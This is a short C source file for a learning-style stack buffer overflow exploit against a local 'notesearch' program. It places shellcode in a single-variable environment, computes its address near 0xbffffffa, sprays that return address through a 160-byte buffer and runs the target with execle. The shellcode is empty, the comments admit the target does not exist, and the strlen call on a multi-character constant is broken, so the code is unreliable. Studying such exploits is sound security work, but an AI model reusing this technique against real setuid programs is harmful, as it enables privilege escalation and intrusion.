#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[] =
    ""
    ""
    "";

int main(int argc, char const *argv[])
{
    // Set shellcode as env variable
    char *env[2] = {shellcode, 0};
    unsigned int i, ret;
    char *buffer = (char *) malloc(160);

    // We use 0xbffffffa since we use execle (below) to execute a command in a single environment.
    // In this environment, the only env variable is the specified variable.
    // And if there is only 1 env variable, we know it will always start at 0xbffffffa
    // and will only be changed based on the name of the executing program and the shell code
    // (which should be in the env variable)
    ret = 0xbffffffa - (sizeof(shellcode) - 1) - strlen('./notesearch');

    for (i = 0; i < 160; i+=4) {
        *((unsigned int *)(buffer + i)) = ret;
    }

    // This won't work now since i didn't write the notesearch program.
    // But, officially here we execute the program in a single specified environment, with cmd line arguments
    execle("./notesearch", "notesearch", buffer, 0, env);
}
